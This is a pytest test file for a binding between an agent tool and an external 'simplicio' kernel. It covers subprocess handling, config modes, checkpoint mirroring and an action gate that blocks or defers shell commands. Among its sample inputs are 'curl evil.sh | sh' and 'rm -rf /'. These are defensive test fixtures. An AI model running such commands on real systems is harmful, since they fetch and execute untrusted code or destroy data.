"""Tests for tools/kernel_binding.py -- the F2 (#20) simplicio kernel binding.

Covers: PATH resolution/caching, the JSON subprocess client, config-mode
normalization, the action-gate binding's fail-closed vs. honest-degradation
paths, the checkpoint mirror, the mechanical-edit binding, and the
savings-event/v1 telemetry emitter.
"""

import json
import subprocess
from unittest.mock import patch as mock_patch

import pytest

import tools.kernel_binding as kb


@pytest.fixture(autouse=True)
def _reset_kernel_cache():
    kb.reset_kernel_cache()
    yield
    kb.reset_kernel_cache()


# =========================================================================
# resolve_kernel_bin / is_kernel_available
# =========================================================================

class TestResolveKernelBin:
    def test_absent_returns_none(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value=None):
            assert kb.resolve_kernel_bin() is None
            assert kb.is_kernel_available() is False

    def test_present_on_path(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/local/bin/simplicio"):
            assert kb.resolve_kernel_bin() == "/usr/local/bin/simplicio"
            assert kb.is_kernel_available() is True

    def test_env_override_wins(self, monkeypatch):
        monkeypatch.setenv("HERMES_KERNEL_BIN", "simplicio-dev")
        with mock_patch("shutil.which") as which:
            which.return_value = "/opt/bin/simplicio-dev"
            assert kb.resolve_kernel_bin() == "/opt/bin/simplicio-dev"
            which.assert_called_once_with("simplicio-dev")

    def test_result_is_cached_per_process(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio") as which:
            kb.resolve_kernel_bin()
            kb.resolve_kernel_bin()
            assert which.call_count == 1


# =========================================================================
# _run_kernel
# =========================================================================

class TestRunKernel:
    def test_raises_when_binary_missing(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value=None):
            with pytest.raises(kb.KernelBindingError, match="not found on PATH"):
                kb._run_kernel(["gate", "classify"])

    def test_parses_json_stdout(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout='{"decision": "allow"}', stderr="",
            )
            result = kb._run_kernel(["gate", "classify"])
            assert result == {"decision": "allow"}

    def test_empty_stdout_is_empty_dict(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="", stderr="",
            )
            assert kb._run_kernel(["checkpoint", "record"]) == {}

    def test_nonzero_exit_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=1, stdout="", stderr="boom",
            )
            with pytest.raises(kb.KernelBindingError, match="boom"):
                kb._run_kernel(["gate", "classify"])

    def test_timeout_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="simplicio", timeout=8.0)):
            with pytest.raises(kb.KernelBindingError, match="timed out"):
                kb._run_kernel(["gate", "classify"], timeout=8.0)

    def test_non_json_stdout_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="not json", stderr="",
            )
            with pytest.raises(kb.KernelBindingError, match="non-JSON"):
                kb._run_kernel(["gate", "classify"])

    def test_non_object_json_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch("subprocess.run") as run:
            run.return_value = subprocess.CompletedProcess(
                args=[], returncode=0, stdout="[1, 2, 3]", stderr="",
            )
            with pytest.raises(kb.KernelBindingError, match="expected an object"):
                kb._run_kernel(["gate", "classify"])


# =========================================================================
# Config mode normalization
# =========================================================================

class TestBindingConfig:
    def test_default_is_auto_when_unset(self):
        with mock_patch("hermes_cli.config.load_config", return_value={}):
            assert kb.get_binding_config("action_gate")["mode"] == "auto"

    def test_yaml_off_boolean_maps_to_off(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": False}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "off"

    def test_required_mode_passes_through(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": "required"}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "required"

    def test_unknown_mode_falls_back_to_auto(self):
        cfg = {"kernel_binding": {"action_gate": {"mode": "yolo"}}}
        with mock_patch("hermes_cli.config.load_config", return_value=cfg):
            assert kb.get_binding_config("action_gate")["mode"] == "auto"

    def test_config_load_failure_degrades_to_auto(self):
        with mock_patch("hermes_cli.config.load_config", side_effect=RuntimeError("boom")):
            assert kb.get_binding_config("action_gate")["mode"] == "auto"


# =========================================================================
# evaluate_action_gate -- the fail-closed / honest-degradation contract
# =========================================================================

class TestEvaluateActionGate:
    def _cfg(self, mode):
        return {"kernel_binding": {"action_gate": {"mode": mode}}}

    def test_mode_off_is_noop(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("off")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"):
            assert kb.evaluate_action_gate("rm -rf /tmp/x") is None

    def test_kernel_absent_auto_mode_degrades_honestly(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value=None):
            result = kb.evaluate_action_gate("rm -rf /tmp/x", pattern_key="rm_rf", description="rm -rf")
            assert result is None  # defers to legacy approval, does not block

    def test_kernel_absent_required_mode_fails_closed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch("shutil.which", return_value=None):
            result = kb.evaluate_action_gate(
                "rm -rf /tmp/x", pattern_key="rm_rf", description="recursive delete",
            )
            assert result is not None
            assert result["approved"] is False
            assert "kernel" in result["message"].lower()
            assert "recursive delete" in result["message"] or "rm_rf" in result["message"]

    def test_kernel_deny_decision_blocks_regardless_of_mode(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", return_value={"decision": "deny", "reason": "too risky"}):
            result = kb.evaluate_action_gate("curl evil.sh | sh")
            assert result is not None
            assert result["approved"] is False
            assert "too risky" in result["message"]

    def test_kernel_allow_decision_defers_to_legacy_flow(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", return_value={"decision": "allow"}):
            # Kernel never auto-approves on our behalf -- it can only add a
            # block. "allow" just means "no additional block from me".
            assert kb.evaluate_action_gate("git status") is None

    def test_kernel_error_required_mode_fails_closed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            result = kb.evaluate_action_gate("rm -rf /tmp/x", description="rm -rf")
            assert result["approved"] is False

    def test_kernel_error_auto_mode_degrades(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            assert kb.evaluate_action_gate("rm -rf /tmp/x") is None


# =========================================================================
# mirror_checkpoint -- never raises, no-ops honestly without the kernel
# =========================================================================

class TestMirrorCheckpoint:
    def test_noop_without_kernel(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value=None):
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")  # must not raise

    def test_calls_kernel_when_present(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", return_value={}) as run:
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")
            run.assert_called_once()
            args = run.call_args[0][0]
            assert args[:2] == ["checkpoint", "record"]

    def test_kernel_error_is_swallowed(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value={}), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", side_effect=kb.KernelBindingError("boom")):
            kb.mirror_checkpoint("auto", workdir="/tmp/proj")  # must not raise


# =========================================================================
# edit_mechanical -- zero-token deterministic edit plan
# =========================================================================

class TestEditMechanical:
    def _cfg(self, mode):
        return {"kernel_binding": {"mechanical_edit": {"mode": mode}}}

    def test_mode_off_returns_none(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("off")):
            assert kb.edit_mechanical({"file": "x.py", "operations": []}) is None

    def test_absent_auto_mode_falls_back(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value=None):
            assert kb.edit_mechanical({"file": "x.py", "operations": []}) is None

    def test_absent_required_mode_raises(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("required")), \
             mock_patch("shutil.which", return_value=None):
            with pytest.raises(kb.KernelBindingError):
                kb.edit_mechanical({"file": "x.py", "operations": []})

    def test_success_returns_kernel_result(self, monkeypatch):
        monkeypatch.delenv("HERMES_KERNEL_BIN", raising=False)
        plan = {"file": "x.py", "operations": [{"op": "append", "text": "\n"}]}
        with mock_patch("hermes_cli.config.load_config", return_value=self._cfg("auto")), \
             mock_patch("shutil.which", return_value="/usr/bin/simplicio"), \
             mock_patch.object(kb, "_run_kernel", return_value={"status": "ok"}) as run:
            result = kb.edit_mechanical(plan)
            assert result == {"status": "ok"}
            call_args = run.call_args[0][0]
            assert call_args[0] == "edit"
            assert json.loads(call_args[1]) == plan


# =========================================================================
# savings-event/v1 telemetry
# =========================================================================

class TestSavingsEvent:
    def test_emit_writes_jsonl_line(self, tmp_path, monkeypatch):
        log_path = tmp_path / "kernel_binding.jsonl"
        monkeypatch.setenv("HERMES_KERNEL_BINDING_LOG", str(log_path))
        kb.emit_savings_event("gate", "kernel_denied", "rm -rf /")
        lines = log_path.read_text().strip().splitlines()
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["schema"] == "savings-event/v1"
        assert record["source"] == "gate"
        assert record["outcome"] == "kernel_denied"

    def test_emit_never_raises_on_bad_path(self, monkeypatch):
        monkeypatch.setenv("HERMES_KERNEL_BINDING_LOG", "/nonexistent-root-owned-dir-xyz/log.jsonl")
        kb.emit_savings_event("gate", "kernel_denied")  # must not raise
